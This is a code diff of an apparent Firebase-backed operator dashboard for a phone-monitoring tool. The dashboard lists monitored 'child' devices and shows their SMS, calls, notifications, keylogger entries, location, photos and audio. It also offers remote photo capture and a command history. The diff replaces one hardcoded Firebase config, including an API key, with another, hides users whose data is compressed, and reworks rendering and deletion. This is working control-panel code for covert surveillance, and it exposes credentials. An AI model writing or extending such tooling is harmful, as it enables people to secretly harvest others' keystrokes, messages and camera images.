@@ -729,15 +729,17 @@
         import { getStorage, ref as storageRef, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
          // --- CONFIGURATION ---
-        const firebaseConfig = {
-          apiKey: "AIzaSyCcpgSbizPnAIfza97vwVnjZAQtoug5FuU",
-          authDomain: "famtoolapp-23028.firebaseapp.com",
-          databaseURL: "https://famtoolapp-23028-default-rtdb.asia-southeast1.firebasedatabase.app",
-          projectId: "famtoolapp-23028",
-          storageBucket: "famtoolapp-23028.firebasestorage.app",
-          messagingSenderId: "823040432046",
-          appId: "1:823040432046:web:35389ce96ba2bdf73f1a3f"
+         const firebaseConfig = {
+          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
+          authDomain: "home-demo12-d5814.firebaseapp.com",
+          databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
+          projectId: "home-demo12-d5814",
+          storageBucket: "home-demo12-d5814.appspot.com",
+          messagingSenderId: "433464727867",
+          appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
+          measurementId: "G-NHHB06Z9HT"
         };
+
 
 
         const app = initializeApp(firebaseConfig);
@@ -869,92 +871,186 @@
             }
         });
         
+        // Track existing users to avoid full re-render
+        let existingUsersMap = new Map();
+        let usersListenerAttached = false;
+        
+        // Helper function to check if user has compressed data (new user)
+        function isCompressedUser(childData) {
+            if (!childData || typeof childData !== 'object') return false;
+            
+            // Check various data nodes for compressed strings
+            const nodesToCheck = ['sms', 'Calls', 'notificationsMessages', 'keyLogger', 'location'];
+            
+            for (const nodeName of nodesToCheck) {
+                const nodeData = childData[nodeName];
+                if (nodeData && nodeData.data && typeof nodeData.data === 'object') {
+                    // Check first entry in data
+                    const firstKey = Object.keys(nodeData.data)[0];
+                    if (firstKey) {
+                        const firstValue = nodeData.data[firstKey];
+                        // If it's a string starting with H4sI, it's gzip compressed
+                        if (typeof firstValue === 'string' && firstValue.startsWith('H4sI')) {
+                            return true; // Compressed user (new)
+                        }
+                    }
+                }
+                // Also check direct Calls node (not nested in data)
+                if (nodeName === 'Calls' && nodeData && typeof nodeData === 'object') {
+                    const firstKey = Object.keys(nodeData)[0];
+                    if (firstKey && firstKey !== 'data') {
+                        const firstValue = nodeData[firstKey];
+                        if (typeof firstValue === 'string' && firstValue.startsWith('H4sI')) {
+                            return true; // Compressed user (new)
+                        }
+                    }
+                }
+            }
+            
+            return false; // Uncompressed user (old) - SHOW this user
+        }
+        
         // --- Core Application Logic ---
         function loadUsersAndSetupChatListeners() {
+            // Only attach listener once to prevent multiple subscriptions
+            if (usersListenerAttached) return;
+            usersListenerAttached = true;
+            
             const usersRef = ref(db, 'user'); 
             onValue(usersRef, (snapshot) => {
-                detachChatIndicatorListeners();
+                const data = snapshot.val();
                 
+                // Store current scroll position
+                const scrollTop = userList.scrollTop;
+                
+                // Get currently active item
                 const activeListItem = document.querySelector('.user-list-item.active');
                 const activeUserId = activeListItem ? activeListItem.dataset.userid : null;
                 const activeChildKey = activeListItem ? activeListItem.dataset.childkey : null;
 
-                userList.innerHTML = '';
-                const data = snapshot.val();
+                // Build new users map
+                const newUsersMap = new Map();
                 let userCount = 0;
 
                 if (data) {
                     Object.keys(data).forEach(userId => {
                         const userProfile = data[userId].profile;
                         const isVerified = userProfile?.emailVerified !== false;
-                        
-                        let verificationIconHTML = '';
-                        if (isVerified) {
-                            verificationIconHTML = `<span class="verification-status verified" title="Email Verified">&#10004;</span>`;
-                        } else {
-                            verificationIconHTML = `<span class="verification-status not-verified" title="Email Not Verified">&#33;</span>`;
-                        }
 
                         Object.keys(data[userId]).forEach(childKey => {
                             if (childKey === 'profile') return;
 
-                            userCount++;
                             const childData = data[userId][childKey];
-                            const userName = childData?.data?.nameChild || childKey;
                             
-                            const listItem = document.createElement('li');
-                            listItem.className = 'user-list-item';
-                            listItem.dataset.userid = userId;
-                            listItem.dataset.childkey = childKey;
-                            listItem.innerHTML = `
-                                ${verificationIconHTML}
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-                                <div>
-                                    <div class="user-name">${userName}</div>
-                                    <div class="device-name">${childData?.data?.nameDevice || 'Unknown'}</div>
-                                    <div class="user-id">User: ${userId}</div>
-                                </div>`;
-                            
-                            if (userId === activeUserId && childKey === activeChildKey) {
-                                listItem.classList.add('active');
+                            // FILTER: Skip compressed users (new users) - only show old uncompressed users
+                            if (isCompressedUser(childData)) {
+                                return; // Skip this user - they have compressed data
                             }
-
-                            userList.appendChild(listItem);
-
-                            const chatRef = ref(db, `chats/${userId}/${childKey}/messages`);
-                            const chatCallback = (chatSnapshot) => {
-                                if (!chatSnapshot.exists()) return;
-
-                                const messages = chatSnapshot.val();
-                                let lastUserTimestamp = 0;
-                                let lastAdminTimestamp = 0;
-
-                                Object.values(messages).forEach(msg => {
-                                    if (msg.sender === 'user' && typeof msg.timestamp === 'number') {
-                                        lastUserTimestamp = Math.max(lastUserTimestamp, msg.timestamp);
-                                    } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') { // *** FIX: Ignored 'auto-reply'
-                                        lastAdminTimestamp = Math.max(lastAdminTimestamp, msg.timestamp);
-                                    }
-                                });
-
-                                const indicator = listItem.querySelector('.sidebar-indicator');
-                                if (lastUserTimestamp > lastAdminTimestamp) {
-                                    if (!indicator) {
-                                        const newIndicator = document.createElement('div');
-                                        newIndicator.className = 'sidebar-indicator';
-                                        listItem.appendChild(newIndicator);
-                                    }
-                                } else {
-                                    if (indicator) indicator.remove();
-                                }
-                            };
-
-                            onValue(chatRef, chatCallback);
-                            activeChatListeners.push({ ref: chatRef, callback: chatCallback });
+                            
+                            userCount++;
+                            const userName = childData?.data?.nameChild || childKey;
+                            const deviceName = childData?.data?.nameDevice || 'Unknown';
+                            const uniqueKey = `${userId}_${childKey}`;
+                            
+                            newUsersMap.set(uniqueKey, {
+                                userId,
+                                childKey,
+                                userName,
+                                deviceName,
+                                isVerified
+                            });
                         });
                     });
-                } else {
+                }
+
+                // Smart update: Only add new items and remove deleted items
+                // Remove items that no longer exist
+                const existingItems = userList.querySelectorAll('.user-list-item');
+                existingItems.forEach(item => {
+                    const key = `${item.dataset.userid}_${item.dataset.childkey}`;
+                    if (!newUsersMap.has(key)) {
+                        // Remove chat listener for this item
+                        const listenerIndex = activeChatListeners.findIndex(l => 
+                            l.userId === item.dataset.userid && l.childKey === item.dataset.childkey
+                        );
+                        if (listenerIndex > -1) {
+                            off(activeChatListeners[listenerIndex].ref);
+                            activeChatListeners.splice(listenerIndex, 1);
+                        }
+                        item.remove();
+                        existingUsersMap.delete(key);
+                    }
+                });
+
+                // Add new items that don't exist yet
+                newUsersMap.forEach((userData, uniqueKey) => {
+                    if (!existingUsersMap.has(uniqueKey)) {
+                        const { userId, childKey, userName, deviceName, isVerified } = userData;
+                        
+                        let verificationIconHTML = isVerified 
+                            ? `<span class="verification-status verified" title="Email Verified">&#10004;</span>`
+                            : `<span class="verification-status not-verified" title="Email Not Verified">&#33;</span>`;
+
+                        const listItem = document.createElement('li');
+                        listItem.className = 'user-list-item';
+                        listItem.dataset.userid = userId;
+                        listItem.dataset.childkey = childKey;
+                        listItem.innerHTML = `
+                            ${verificationIconHTML}
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                            <div>
+                                <div class="user-name">${userName}</div>
+                                <div class="device-name">${deviceName}</div>
+                                <div class="user-id">User: ${userId}</div>
+                            </div>`;
+                        
+                        if (userId === activeUserId && childKey === activeChildKey) {
+                            listItem.classList.add('active');
+                        }
+
+                        userList.appendChild(listItem);
+                        existingUsersMap.set(uniqueKey, true);
+
+                        // Setup chat listener for new item
+                        const chatRef = ref(db, `chats/${userId}/${childKey}/messages`);
+                        const chatCallback = (chatSnapshot) => {
+                            if (!chatSnapshot.exists()) return;
+
+                            const messages = chatSnapshot.val();
+                            let lastUserTimestamp = 0;
+                            let lastAdminTimestamp = 0;
+
+                            Object.values(messages).forEach(msg => {
+                                if (msg.sender === 'user' && typeof msg.timestamp === 'number') {
+                                    lastUserTimestamp = Math.max(lastUserTimestamp, msg.timestamp);
+                                } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') {
+                                    lastAdminTimestamp = Math.max(lastAdminTimestamp, msg.timestamp);
+                                }
+                            });
+
+                            const indicator = listItem.querySelector('.sidebar-indicator');
+                            if (lastUserTimestamp > lastAdminTimestamp) {
+                                if (!indicator) {
+                                    const newIndicator = document.createElement('div');
+                                    newIndicator.className = 'sidebar-indicator';
+                                    listItem.appendChild(newIndicator);
+                                }
+                            } else {
+                                if (indicator) indicator.remove();
+                            }
+                        };
+
+                        onValue(chatRef, chatCallback);
+                        activeChatListeners.push({ ref: chatRef, callback: chatCallback, userId, childKey });
+                    }
+                });
+
+                // Restore scroll position
+                userList.scrollTop = scrollTop;
+
+                if (newUsersMap.size === 0) {
                     userList.innerHTML = '<li>No users found.</li>';
+                    existingUsersMap.clear();
                 }
                 sidebarTitle.textContent = `Users (${userCount})`;
             });
@@ -1230,7 +1326,7 @@
                     const time = parts[0] || '';
                     const action = (parts[1] || 'Action').replace(/[()]/g, '');
                     const text = parts[2] || 'N/A';
-                    contentHTML += `<div class="keylog-card"><div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text">${text}</p><div class="keylog-footer">${time}</div></div>`;
+                    contentHTML += `<div class="keylog-card"><div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text">${text}</p><div class="keylog-footer">${time}</div></div>`;
                 }
             });
 
@@ -1640,41 +1736,54 @@
             activeDataListener = { ref: audioDataRef, callback: callback };
         }
 
-        modalDataDisplayArea.addEventListener('click', (e) => {
+        modalDataDisplayArea.addEventListener('click', async (e) => {
             const button = e.target.closest('button');
             if (!button) return;
             const { userId, childKey, userName } = selectedUserInfo;
             
             if (button.classList.contains('clear-category-btn')) {
                 const category = button.dataset.category;
+                const span = button.querySelector('span');
+                const originalText = span ? span.textContent : 'Clear';
                 
-                if (category === 'CommandHistory') {
-                    if (confirm(`Are you sure you want to delete all Command History for '${userName}'? This cannot be undone.`)) {
-                         remove(ref(db, getCategoryPath(category, userId, childKey)))
-                            .then(() => alert(`Command History data cleared.`))
-                            .catch((err) => alert(`Error: ${err.message}`));
-                    }
-                    return;
+                // Confirm before delete
+                const confirmMessage = category === 'CommandHistory' 
+                    ? `Are you sure you want to delete all Command History for '${userName}'? This cannot be undone.`
+                    : `Are you sure you want to delete all ${category} data for '${userName}'? This cannot be undone.`;
+                
+                if (!confirm(confirmMessage)) return;
+                
+                // Disable button and show loading
+                button.disabled = true;
+                if (span) span.textContent = 'Deleting...';
+                button.style.opacity = '0.6';
+                
+                // Detach active data listener FIRST to prevent re-renders during delete
+                if (activeDataListener) {
+                    off(activeDataListener.ref, 'value', activeDataListener.callback);
+                    activeDataListener = null;
                 }
-
-                if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'? This cannot be undone.`)) {
+                
+                try {
                     if (category === 'photo') { 
-                        clearAllPhotos(userId, childKey); 
-                    } else if (category === 'video') {
-                        remove(ref(db, getCategoryPath(category, userId, childKey)))
-                            .then(() => alert(`${category} data cleared.`))
-                            .catch((err) => alert(`Error: ${err.message}`));
-                    } else if (category === 'audio') {
-                        remove(ref(db, getCategoryPath(category, userId, childKey)))
-                            .then(() => alert(`${category} data cleared.`))
-                            .catch((err) => alert(`Error: ${err.message}`));
-                    } 
-                    else { 
-                        remove(ref(db, getCategoryPath(category, userId, childKey)))
-                            .then(() => alert(`${category} data cleared.`))
-                            .catch((err) => alert(`Error: ${err.message}`));
+                        await clearAllPhotos(userId, childKey);
+                    } else {
+                        await remove(ref(db, getCategoryPath(category, userId, childKey)));
+                        alert(`${category} data cleared successfully.`);
                     }
+                    
+                    // Show empty state after successful delete
+                    modalDataDisplayArea.innerHTML = `<p style="text-align: center; padding: 20px;">✅ ${category} data has been cleared.</p>`;
+                    
+                } catch (err) {
+                    console.error('Error clearing data:', err);
+                    alert(`Error: ${err.message}`);
+                    // Re-enable button on error
+                    button.disabled = false;
+                    if (span) span.textContent = originalText;
+                    button.style.opacity = '1';
                 }
+                return;
             }
             
             if (button.classList.contains('capture-photo-btn')) {
@@ -1762,18 +1871,15 @@
         }
         
         async function clearAllPhotos(userId, childKey) {
-            modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photo records...</p>';
             try {
                 await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
                 alert('All photo records have been deleted.');
+                return true;
             } catch (error) {
                 console.error("Error clearing photo records:", error);
-                alert("An error occurred while deleting photo records.");
-                renderPhotosFromDatabase(userId, childKey);
+                throw error; // Re-throw to be caught by caller
             }
         }
     </script>
 </body>
 </html>
-
-
